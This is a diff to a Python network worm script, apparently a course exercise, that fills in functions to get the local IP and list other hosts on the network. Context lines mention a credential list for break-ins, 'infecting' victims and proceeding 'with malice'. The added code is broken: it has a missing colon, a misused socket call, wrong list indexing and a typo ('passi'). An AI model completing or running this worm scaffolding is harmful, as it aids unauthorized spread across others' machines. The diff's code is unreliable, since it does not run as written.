@@ -4,6 +4,8 @@ import socket
 import nmap
 import netinfo
 import os
+import socket
+from hostscan import live_hosts
 
 # The list of credentials to attempt
 credList = [
@@ -142,7 +144,10 @@ def getMyIP(interface):
 
     # TODO: Change this to retrieve and
     # return the IP of the current system.
-    return None
+    host_name = socket.gethostname()
+    ip_addr = socket.gethostbyname(host_name)
+    
+    return ip_addr
 
 #######################################################
 # Returns the list of systems on the same network
@@ -154,7 +159,12 @@ def getHostsOnTheSameNetwork():
     # for hosts on the same network
     # and return the list of discovered
     # IP addresses.
-    pass
+    other_systems = []
+    for i in live_hosts
+        host_name = socket.gethostname(live_hosts[i])
+        other_systems.append(host_name)
+    
+    return other_systems
 
 #######################################################
 # Clean by removing the marker and copied worm program
@@ -181,7 +191,7 @@ if len(sys.argv) < 2:
     # TODO: If we are running on the victim, check if
     # the victim was already infected. If so, terminate.
     # Otherwise, proceed with malice.
-    pass
+    passi
 # TODO: Get the IP of the current system
 
 
